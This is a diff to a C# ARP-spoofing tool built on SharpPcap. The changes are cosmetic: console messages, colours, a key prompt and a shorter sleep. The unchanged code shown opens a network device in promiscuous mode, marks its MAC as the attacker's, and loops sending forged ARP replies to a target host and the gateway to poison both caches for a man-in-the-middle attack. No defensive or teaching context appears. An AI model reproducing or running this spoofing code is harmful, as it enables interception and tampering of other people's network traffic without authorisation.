@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
@@ -12,9 +12,11 @@ class Program
         var devices = CaptureDeviceList.Instance;
         foreach (var dev in devices)
         {
-            Console.WriteLine("Name: {0} | Desc: {1} | Mac: {2}\n", dev.Name, dev.Description, dev.MacAddress);
-            Console.ReadKey();
+            Console.WriteLine("Name: {0} | Desc: {1} | Mac: {2}", dev.Name, dev.Description, dev.MacAddress);
         }
+
+        Console.WriteLine("Press any key to continue...");
+        Console.ReadKey();
 
         if (devices.Count < 1)
         {
@@ -23,6 +25,8 @@ class Program
         }
 
         var device = devices[2];
+
+        Console.WriteLine("Using: {0}", device.Name);
         device.Open(DeviceModes.Promiscuous);
 
         PhysicalAddress attackerMac = device.MacAddress; // ATTACKER MAC ADDRESS
@@ -48,7 +52,10 @@ class Program
 
                 ethernetPacket.PayloadPacket = arpReplyToTarget;
                 device.SendPacket(ethernetPacket);
-                Console.WriteLine("--- [SPOOFED REPLY TO TARGET] ARP Packet sent ---");
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("--- [SPOOFED REPLY TO {0}] ARP Packet sent ---", targetIp);
+                Console.ResetColor();
 
                 var arpReplyToGateway = new ArpPacket(
                     ArpOperation.Response,
@@ -60,15 +67,20 @@ class Program
 
                 ethernetPacket.PayloadPacket = arpReplyToGateway;
                 device.SendPacket(ethernetPacket);
-                Console.WriteLine("--- [SPOOFED REPLY TO GATEWAY] ARP Packet sent ---");
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("--- [SPOOF REPLY TO {0}] ARP Packet sent ---", gatewayIp);
+                Console.ResetColor();
             }
             catch (Exception ex)
             {
+                Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("--- ARP Packet NOT sent ---");
                 Console.WriteLine(ex.Message);
+                Console.ResetColor();
             }
 
-            Thread.Sleep(3000);
+            Thread.Sleep(2000);
         }
 
         //device.Close();
